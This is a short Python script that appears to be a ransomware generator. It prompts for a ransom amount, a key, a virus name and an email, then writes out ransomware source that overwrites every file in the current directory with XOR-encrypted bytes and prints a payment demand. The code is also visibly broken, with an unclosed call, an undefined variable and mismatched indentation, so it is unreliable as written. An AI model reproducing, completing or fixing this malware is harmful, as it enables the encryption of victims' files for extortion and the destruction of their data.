rescue = input("rescue (numeric): ")
key = input("key to decrypt (numeric)")
name = input("name of the virus: ")
mail = input("mail to use: ")
print(alert(
ranson = """from getpass import getuser
import os

dirs = os.listdir('./')
key = {}
texto = ''

for dir in dirs:
   try:
      archivo = open(dir, 'rb')
      for linea in archivo:
          texto += linea
      with open (dir, 'w') as filer:
         bit = bytearray(texto)
         for byte, value in bit:
            bit[value] = (key ^ byte) * key
         filer.write(cifrad)        
    except IsADirectoryError:
       print('Error')
print('give to {} {} €/$')
""".format(key, mail, rescue)
with open (name, "w"):
   name.write(ranson)
   print("Finished")